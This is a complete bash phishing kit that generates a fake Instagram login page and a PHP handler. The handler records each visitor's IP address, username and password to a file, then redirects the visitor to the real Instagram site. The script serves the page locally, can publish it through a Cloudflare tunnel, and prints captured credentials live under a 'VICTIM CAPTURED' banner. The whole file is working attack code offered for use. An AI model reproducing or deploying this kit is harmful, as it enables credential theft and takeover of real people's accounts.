#!/bin/bash

# --- 1. COLORS & SETUP ---
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

# --- CLEANUP TRAP (Auto Kill) ---
cleanup() {
    echo -e "\n${RED}[!] Stopping Services & Cleaning Up...${RESET}"
    killall php > /dev/null 2>&1
    killall cloudflared > /dev/null 2>&1
    # Specific Port Kill
    if [[ ! -z "$PORT" ]]; then fuser -k $PORT/tcp > /dev/null 2>&1; fi
    rm -f cloud.log
    echo -e "${GREEN}[✔] Bye!${RESET}"
    exit
}
trap cleanup SIGINT SIGTERM

# --- 2. BANNER ---
clear
echo -e "${BLUE}"
cat << "EOF"
    _    _   _ _   _ ____       _    ____    _   _ _   _______  
   / \  | \ | | | | |  _ \     / \  / ___|  | | | | |/ /  _ \ 
  / _ \ |  \| | | | | |_) |   / _ \| |  _    | |_| | ' /| |_) |
 / ___ \| |\  | |_| |  _ <   / ___ \ |_| |  |  _  | . \|  _ < 
/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|  |_| |_|_|\_\_| \_\
                                                              
EOF
echo -e "${RESET}"
echo -e "${CYAN}[+] Tool      : ${YELLOW}ANURAG HKR FINAL${RESET}"
echo -e "${CYAN}[+] Feature   : ${GREEN}AUTO-SUBMIT & DUAL LINKS${RESET}"
echo ""

# --- 3. AUTO-SUBMIT INPUTS (NO ENTER KEY NEEDED) ---

# Question 1: Port
echo -ne "${YELLOW}[?] Want Custom Port? (y/n): ${RESET}"
read -n 1 port_choice # -n 1 ka matlab sirf 1 button dabte hi aage badho
echo "" # New line

if [[ "$port_choice" == "y" || "$port_choice" == "Y" ]]; then
    echo -ne "${CYAN}    >> Enter Port Number: ${RESET}"
    read PORT
else
    echo -e "${GREEN}    >> Using Default Port: 8080${RESET}"
    PORT=8080
fi

# Question 2: Cloudflare
echo -ne "${YELLOW}[?] Start Cloudflare Tunnel? (y/n): ${RESET}"
read -n 1 cloud_choice
echo "" # New line

# --- 4. PREPARE SERVER ---
# Clean Port First
fuser -k $PORT/tcp > /dev/null 2>&1
rm -rf auth/ cloud.log
mkdir -p auth
touch usernames.txt

# --- 5. CREATE FAKE PAGE (Instagram) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<style>
body{background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{width:350px;text-align:center;padding:20px;}
input{width:100%;padding:10px;margin:5px 0;background:#121212;border:1px solid #333;color:#fff;border-radius:3px;}
button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:3px;font-weight:bold;margin-top:10px;cursor:pointer;}
</style>
</head>
<body>
<div class="card">
    <img src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png" width="50">
    <h2 style="margin:15px 0;">Instagram</h2>
    <form action="login.php" method="POST">
        <input type="text" name="user" placeholder="Phone number, username, or email" required>
        <input type="password" name="pass" placeholder="Password" required>
        <button type="submit">Log in</button>
    </form>
</div>
</body>
</html>
EOF

cat > auth/login.php <<EOF
<?php
file_put_contents("../usernames.txt", "IP: " . \$_SERVER['REMOTE_ADDR'] . " | User: " . \$_POST['user'] . " | Pass: " . \$_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 6. START PHP SERVER ---
echo -e "${BLUE}[*] Starting Localhost on Port $PORT...${RESET}"
php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

# --- 7. CLOUDFLARE LOGIC ---
CLOUD_LINK=""

if [[ "$cloud_choice" == "y" || "$cloud_choice" == "Y" ]]; then
    echo -e "${YELLOW}[*] Starting Cloudflare Tunnel...${RESET}"
    
    # Download check
    if [[ ! -f "cloudflared" ]]; then
        echo -e "${CYAN}    >> Downloading Binary...${RESET}"
        if [[ $(uname -m) == "aarch64" ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        fi
        chmod +x cloudflared
    fi

    # Run Tunnel
    ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
    
    echo -ne "${GREEN}[*] Generating Link... ${RESET}"
    for i in {1..10}; do
        sleep 2
        if grep -q "trycloudflare.com" cloud.log; then
            CLOUD_LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cloud.log | head -n 1)
            break
        fi
        echo -ne "."
    done
    echo ""
fi

# --- 8. DISPLAY ALL LINKS ---
echo -e "\n${CYAN}════════════════════════════════════════════════════${RESET}"
echo -e "${GREEN}[✔] SERVERS RUNNING SUCCESSFULLY:${RESET}"
echo -e ""
echo -e "${WHITE} [1] LOCALHOST  : ${YELLOW}http://127.0.0.1:$PORT${RESET}"

if [[ ! -z "$CLOUD_LINK" ]]; then
    echo -e "${WHITE} [2] CLOUDFLARE : ${YELLOW}$CLOUD_LINK${RESET}"
elif [[ "$cloud_choice" == "y" || "$cloud_choice" == "Y" ]]; then
    echo -e "${RED} [2] CLOUDFLARE : Failed to generate link (Check Internet)${RESET}"
fi
echo -e "${CYAN}════════════════════════════════════════════════════${RESET}"

# --- 9. MONITORING ---
echo -e "\n${RED}[*] Waiting for Credentials... (Ctrl+C to Stop)${RESET}"
tail -n 0 -f usernames.txt | while read line; do
    echo -e "${GREEN}[+] VICTIM CAPTURED: ${RESET}$line"
    echo -e "\a"
done
